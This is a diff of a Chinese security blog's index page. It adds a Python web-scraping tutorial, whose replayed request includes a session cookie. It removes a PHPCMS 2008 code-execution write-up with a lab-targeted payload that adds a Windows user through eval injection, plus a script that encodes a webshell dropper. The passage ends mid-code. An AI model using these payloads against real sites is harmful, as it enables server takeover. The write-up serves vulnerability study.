@@ -150,6 +150,99 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-爬虫三" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/17/爬虫三/">爬虫三</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/17/爬虫三/" class="archive-article-date">
+  	<time datetime="2018-12-17T07:39:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><ul>
+<li>解析内容：<ul>
+<li>from bs4 import BeautifulSoup</li>
+<li>soup = BeautifulSoup(html_doc)</li>
+</ul>
+</li>
+<li>浏览数据<ul>
+<li>soup.title</li>
+<li>soup.title.string</li>
+</ul>
+</li>
+<li>BeautifulSoup正则<ul>
+<li>soup.find_all(name=’x’,attrs={‘xx’:re.compile(‘xxx’)})</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.ysdyzx.com'</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(r.content, <span class="string">'lxml'</span>)</span><br><span class="line">news=soup.find_all(name=<span class="string">'a'</span>,attrs=&#123;<span class="string">'href'</span>:re.compile(<span class="string">'/a/xiaoyuandongtai/xinwenkuaixun/\d*?.html'</span>)&#125;)</span><br><span class="line"><span class="comment"># news = soup.find_all(name='a', attrs=&#123;'target': '_blank'&#125;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> new <span class="keyword">in</span> news:</span><br><span class="line">    <span class="keyword">print</span> new.string</span><br></pre></td></tr></table></figure>
+<h2 id="hackhttp"><a href="#hackhttp" class="headerlink" title="hackhttp"></a>hackhttp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发起get，post请求，发起http原始数据包</span></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line">hh = hackhttp.hackhttp()</span><br><span class="line">url = <span class="string">"http://xxxxx"</span></span><br><span class="line">code,head,html,redirect_url,log = hh.http(url)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> BS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tomcat</span><span class="params">(raw)</span>:</span></span><br><span class="line">    url = <span class="string">'http://www.cnvd.org.cn/flaw/list.htm?flag=true'</span></span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    code, head, html, redirect, log = hh.http(url=url, raw=raw)</span><br><span class="line">    soup = BS(html, <span class="string">'lxml'</span>)</span><br><span class="line">    tomcat_html = soup.tbody</span><br><span class="line">    tomcat_cnvds = BS(str(tomcat_html), <span class="string">'lxml'</span>)</span><br><span class="line">    cnvds = tomcat_cnvds.find_all(name=<span class="string">'a'</span>, attrs=&#123;<span class="string">'href'</span>: re.compile(<span class="string">'/flaw/show/CNVD-.*?'</span>)&#125;)</span><br><span class="line">    <span class="keyword">for</span> cnvd <span class="keyword">in</span> cnvds:</span><br><span class="line">        <span class="keyword">print</span> cnvd[<span class="string">'title'</span>]</span><br><span class="line"></span><br><span class="line">raw_start = <span class="string">'''</span></span><br><span class="line"><span class="string">POST /flaw/list.htm?flag=true HTTP/1.1</span></span><br><span class="line"><span class="string">Host: www.cnvd.org.cn</span></span><br><span class="line"><span class="string">Content-Length: 388</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Origin: http://www.cnvd.org.cn</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span></span><br><span class="line"><span class="string">Referer: http://www.cnvd.org.cn/flaw/list.htm?flag=true</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: __jsluid=558a536188ba647ef4c0e8bfc29ad880; bdshare_firstime=1537405268263; JSESSIONID=9E0ED054CFE20F5D376D50D5BF537B06</span></span><br><span class="line"><span class="string">number=%E8%AF%B7%E8%BE%93%E5%85%A5%E7%B2%BE%E7%A1%AE%E7%BC%96%E5%8F%B7&amp;startDate=&amp;endDate=&amp;field=&amp;order=&amp;flag=true&amp;keyword=tomcat&amp;condition=1&amp;keywordFlag=0&amp;cnvdId=&amp;cnvdIdFlag=0&amp;baseinfoBeanbeginTime=&amp;baseinfoBeanendTime=&amp;baseinfoBeanFlag=0&amp;refenceInfo=&amp;referenceScope=-1&amp;manufacturerId=-1&amp;categoryId=-1&amp;editionId=-1&amp;causeIdStr=&amp;threadIdStr=&amp;serverityIdStr=&amp;positionIdStr=&amp;max=20&amp;offset='''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pages_count <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">180</span>, <span class="number">20</span>):</span><br><span class="line">    raw = raw_start + str(pages_count)</span><br><span class="line">    tomcat(raw)</span><br></pre></td></tr></table></figure>
+<h2 id="实例1-ichunqiu及jiandan"><a href="#实例1-ichunqiu及jiandan" class="headerlink" title="实例1-ichunqiu及jiandan"></a>实例1-ichunqiu及jiandan</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多线程实例</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(data)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'User-agent'</span>: <span class="string">'showmeshell spider for ichunqiu ver=1.0'</span>&#125;</span><br><span class="line">    url = <span class="string">'http://www.ichunqiu.com/courses/ajaxCourses'</span></span><br><span class="line">    r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    datas = json.loads(r.content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas[<span class="string">'course'</span>][<span class="string">'result'</span>]:</span><br><span class="line">        <span class="keyword">print</span> data[<span class="string">'courseName'</span>], data[<span class="string">'producerName'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    data = <span class="string">'courseTag=&amp;courseDiffcuty=&amp;IsExp=&amp;producerId=&amp;orderField=&amp;orderDirection=&amp;tagType=2&amp;pageIndex='</span> + str(i)</span><br><span class="line">    thread.start_new_thread(spider, (data,))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JianDan</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            url = self._queue.get_nowait()</span><br><span class="line">            self.spider(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        headers = &#123;<span class="string">'User-agent'</span>: <span class="string">'showmeshell spider for jiandan ver=1.0'</span>&#125;</span><br><span class="line">        r = requests.get(url=url, headers=headers)</span><br><span class="line">        <span class="keyword">print</span> r.status_code, len(r.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    queue = Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2180</span>, <span class="number">2184</span>):</span><br><span class="line">        queue.put(<span class="string">'http://jandan.net/ooxx/page-'</span> + str(i))</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    thread_count = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count):</span><br><span class="line">        threads.append(JianDan(queue))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment">#########</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://jandan.net/pic/page-2162'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jiandan</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            url = self._queue.get_nowait()</span><br><span class="line">            self.spider(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        headers = &#123;<span class="string">'User-agent'</span>: <span class="string">'jiandan spider by showmeshell ver=1.0'</span>&#125;</span><br><span class="line">        r = requests.get(url=url, headers=headers)</span><br><span class="line">        soup = bs(r.content, <span class="string">'lxml'</span>)</span><br><span class="line">        imgs = soup.find_all(name=<span class="string">'img'</span>, attrs=&#123;&#125;)</span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> imgs:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'onload'</span> <span class="keyword">in</span> str(img):</span><br><span class="line">                img = img[<span class="string">'org_src'</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                img = img[<span class="string">'src'</span>]</span><br><span class="line">            name = img.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">            urllib.urlretrieve(img, filename=<span class="string">'img/'</span> + name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    queue = Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2159</span>, <span class="number">2162</span>):</span><br><span class="line">        queue.put(<span class="string">'http://jandan.net/pic/page-2162'</span> + str(i))</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    threading_count = <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threading_count):</span><br><span class="line">        threads.append(Jiandan(queue))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/17/爬虫三/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-基础知识" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1592,120 +1685,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PHPCMS-2008-命令执行漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/02/PHPCMS-2008-命令执行漏洞/">PHPCMS 2008 命令执行漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/02/PHPCMS-2008-命令执行漏洞/" class="archive-article-date">
-  	<time datetime="2018-12-02T06:23:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>PHPCMS</strong></p>
-<p>PHPCMS网站管理系统是国内主流的CMS系统之一，目前已有数万网站的应用规模，拥有政府、企业、媒体等各个行业进千名商业用户。</p>
-<p><strong>漏洞介绍</strong></p>
-<p>PHPCMS 2008黄页模块漏洞变量初始化不严导致任意PHP代码执行，在系统函数string2array中调用eval有高风险，在<code>/yp/web/include/common.inc.php</code>中$menu变量初始化不严，导致可以注入执行任意PHP代码。</p>
-<p><strong>影响范围</strong></p>
-<p>PHPCMS 2008 版本</p>
-<p><strong>漏洞危害</strong></p>
-<p>攻击者通过代码执行漏洞，直接可执行系统命令，甚至直接可以直接获取服务器权限，对服务器安全造成极大的威胁</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞代码位于<code>/yp/web/include/common.inc.php</code> 中，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"></span><br><span class="line">$userid = $userid ? $userid : intval(QUERY_STRING);</span><br><span class="line">$r = $db-&gt;get_one(<span class="string">"SELECT * FROM `"</span>.DB_PRE.<span class="string">"member_company` WHERE `userid`='$userid'"</span>);</span><br><span class="line"><span class="keyword">if</span>($r)</span><br><span class="line">&#123;</span><br><span class="line"> extract($r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$userid)</span><br><span class="line">&#123;</span><br><span class="line"> $MS[<span class="string">'title'</span>] = <span class="string">'你要访问的站点不存在'</span>;</span><br><span class="line"> $MS[<span class="string">'description'</span>] = <span class="string">'请核对网址是否正确.'</span>;</span><br><span class="line"> $MS[<span class="string">'urls'</span>][<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">'name'</span>=&gt;<span class="string">'访问网站首页'</span>,</span><br><span class="line">  <span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>],</span><br><span class="line">  );</span><br><span class="line"> $MS[<span class="string">'urls'</span>][<span class="number">1</span>] = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">'name'</span>=&gt;<span class="string">'注册为本站会员'</span>,</span><br><span class="line">  <span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>].<span class="string">'member/register.php'</span>,</span><br><span class="line">  );</span><br><span class="line"> msg($MS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($tplname)) $tplname = <span class="string">'default'</span>;</span><br><span class="line"><span class="comment">//用户选择的默认模板</span></span><br><span class="line">$companytpl_config = <span class="keyword">include</span> PHPCMS_ROOT.<span class="string">'templates/'</span>.TPL_NAME.<span class="string">'/yp/companytplnames.php'</span>;</span><br><span class="line"></span><br><span class="line">$tpl = $companytpl_config[$tplname][<span class="string">'tplname'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define(<span class="string">'TPL'</span>, $tpl);</span><br><span class="line">define(<span class="string">'WEB_SKIN'</span>, <span class="string">'templates/'</span>.TPL_NAME.<span class="string">'/yp/css/'</span>);</span><br><span class="line"><span class="keyword">if</span>($diy)</span><br><span class="line">&#123;</span><br><span class="line"> define(<span class="string">'SKIN_DIY'</span>, WEB_SKIN.$userid.<span class="string">'_diy.css'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> define(<span class="string">'SKIN_DIY'</span>, WEB_SKIN.$companytpl_config[$tplname][<span class="string">'style'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$menu = string2array($menu);</span><br></pre></td></tr></table></figure>
-<p>首先判断有没有定义常量，如果没有定义则提示越权访问，然后从数据库取了一条数据，放到r变量中，如果取成功则使用<code>extract</code>执行r变量。</p>
-<p>extract的意思是：将变量从数组中导入到当前的符号表中。</p>
-<p>我们接着看，如果没有成功，会跳出循环，判断是否存在userid，如果不存在就输出提示信息，如果存在就继续执行，加载模板，加载完之后，我们在最后可以看到这么一行代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$menu = string2array($menu);</span><br></pre></td></tr></table></figure>
-<p>但是我们从开头到这里，并没有看到menu的出现，继续往下看。</p>
-<p>在<code>include/global.func.php</code> 的675行，找到了string2array函数，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string2array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($data ==<span class="string">''</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">"\$array = $data;"</span>);</span><br><span class="line">  <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>首先定义了函数string2array，再判断data是否为空，如果是空则返回一个空的数组，如果不是空，则执行eval函数，看到这里就很熟悉了，eval在常用的一句话木马中很常见，它的作用是将字符串当做php代码去执行。</p>
-<p><strong>因此可以尝试传入一个 <code>$_GET[&#39;menu&#39;]</code> ，初始化$menu ，如果再入构造一个不存在的userid，就可以直接将menu的值传入到eval里面去了。</strong></p>
-<p>总的来说，就是因为此处可能查询无结果</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$r = $db-&gt;get_one(<span class="string">"SELECT * FROM `"</span>.DB_PRE.<span class="string">"member_company` WHERE `userid`='$userid'"</span>);</span><br></pre></td></tr></table></figure>
-<p>而导致下面的逻辑，执行不严谨。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($r)</span><br><span class="line">&#123;</span><br><span class="line">extract($r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们结合phpcms的全局变量初始化机制，可以构造$menu变量，结合string2array函数调用eval的漏洞，成功执行任意代码。</p>
-<p>我们可以构建Payload，添加用户，登录目标机器，如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.12.2/yp/web/index.php?userid=abc&amp;menu=system(net user test test /add);exit();</span><br></pre></td></tr></table></figure>
-<p>然后使用账号密码为：test，test去登录。但是这样是不可行的，<strong>需要对空格和符号进行编码</strong>，才可以成功执行命令，编码后如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.12.2/yp/web/index.php?userid=abc&amp;menu=system(net.CHR(32).user.CHR(32).test.CHR(32).test .CHR(32).CHR(47).add);exit();</span><br></pre></td></tr></table></figure>
-<p><code>.</code> 代表连接符的意思</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接执行payload即可：<code>172.16.12.2/yp/web/index.php?userid=abc&amp;menu=system(net.CHR(32).user.CHR(32).test.CHR(32).test .CHR(32).CHR(47).add);exit();</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># text = "file_put_contents('shell.php','&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;');"</span></span><br><span class="line">text = <span class="string">"shell.php,&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;"</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">    <span class="keyword">if</span> text[i] != <span class="string">','</span>:</span><br><span class="line">        output += <span class="string">"CHR(%s)"</span> % ord(text[i])</span><br><span class="line">        <span class="keyword">if</span> i &lt; len(text) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> text[i + <span class="number">1</span>] != <span class="string">','</span>:</span><br><span class="line">                output += <span 